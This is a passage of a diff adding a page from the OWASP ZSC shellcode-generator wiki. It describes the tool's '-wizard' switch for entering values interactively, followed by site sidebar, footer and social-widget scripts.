+With <strong>-wizard</strong> switch you are able to generate shellcode without long ARGVs, software will ask you for information.</p>
+
+<center><img src="http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_132639.png"></center>
+
+
+<p><br><strong>Note</strong>: While you are using <strong>-wizard</strong> switch, if you push &ldquo;<strong>Enter</strong>&rdquo; without typing anything, the default value will be set on the varible.
+<br><strong>Note</strong>: With entering &ldquo;<strong>list</strong>&rdquo;, List of values will be shown.
+<br><br><br><br><br></p>
+
+  
+    <footer>
+      
+      
+        <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://zsc.z3r0d4y.com/wiki/index.html" data-via="Ali_Razmjo0" data-counturl="http://zsc.z3r0d4y.com/wiki/index.html" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+      
+    </footer>
+  
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/08/01/generate-pe-file-with-zsc-shellcodes/">Generate PE File With OWASP ZSC Shellcodes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/27/video-how-to-install-and-generate-shellcode-using-zsc/">Video: How to Install and Generate Shellcode Using OWASP ZSC</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/Ali-Razmjoo">@Ali-Razmjoo</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'Ali-Razmjoo',
+            count: 100,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+<section class="googleplus">
+  <h1>
+    <a href="https://plus.google.com/107173281386135128055?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+<br><center><a href="https://owasp.org/"><img src="https://www.owasp.org/skins/owasplogo.png"></a></center>
+</section>
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+<center><font color = "white">
+  Copyright &copy; 2016 - <strong>Ali Razmjoo</strong>
+</font></center>
+</p>
+
+</footer>
+  
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
